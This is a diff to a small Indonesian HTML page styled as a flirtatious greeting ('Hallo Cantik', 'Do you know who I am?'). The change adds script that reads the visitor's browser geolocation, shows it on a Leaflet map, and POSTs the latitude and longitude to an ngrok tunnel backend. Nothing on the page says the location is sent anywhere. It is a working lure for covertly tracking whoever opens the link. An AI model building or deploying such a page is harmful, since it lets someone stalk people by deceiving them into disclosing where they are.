@@ -1,34 +1,69 @@
+<!DOCTYPE html>
 <html>
   <head>
     <title>Hallo Cantik</title>
+
+    <!-- Leaflet CSS -->
+    <link
+      rel="stylesheet"
+      href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+    />
+
     <style>
-      #mapstarget {
+      #map {
         height: 400px;
         width: 100%;
       }
     </style>
   </head>
-  <body>
-    <h1>Boleh kenalan Gak ,Tau gak aku siapa?</h1>
-    <p>
-      <span id="latitude"></span><br />
-      <span id="longitude"></span>
-    </p>
-    <hr />
-    <div id="mapstarget"></div>
-  </body>
-  <script type="text/javascript">
-    navigator.geolocation.getCurrentPosition(
-      function (position) {
-        const lat = position.coords.latitude;
-        const long = position.coords.longitude;
 
-        document.getElementById("latitude").textContent = "Latitude : " + lat;
-        document.getElementById("longitude").textContent = "longitude: " + long;
-      },
-      function (error) {
-        console.log("eror :" + error.message);
-      }
-    );
-  </script>
+  <body>
+    <h1>Boleh kenalan gak? Tau gak aku siapa?</h1>
+
+    <p id="info">Mengambil lokasi...</p>
+
+    <div id="map"></div>
+
+    <!-- Leaflet JS -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+    <script>
+      const BACKEND_URL = "https://cayden-refined-keisha.ngrok-free.dev/lokasi";
+
+      const map = L.map("map").setView([0, 0], 2);
+
+      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
+        attribution: "© OpenStreetMap contributors",
+      }).addTo(map);
+
+      navigator.geolocation.getCurrentPosition(
+        function (position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          document.getElementById(
+            "info"
+          ).innerHTML = `Latitude: ${lat}<br>Longitude: ${lon}`;
+
+          map.setView([lat, lon], 16);
+          L.marker([lat, lon]).addTo(map).bindPopup("Lokasi kamu").openPopup();
+
+          // Kirim ke backend
+          fetch(BACKEND_URL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              latitude: lat,
+              longitude: lon,
+            }),
+          });
+        },
+        function (error) {
+          document.getElementById("info").innerText = "Izin lokasi ditolak";
+        }
+      );
+    </script>
+  </body>
 </html>
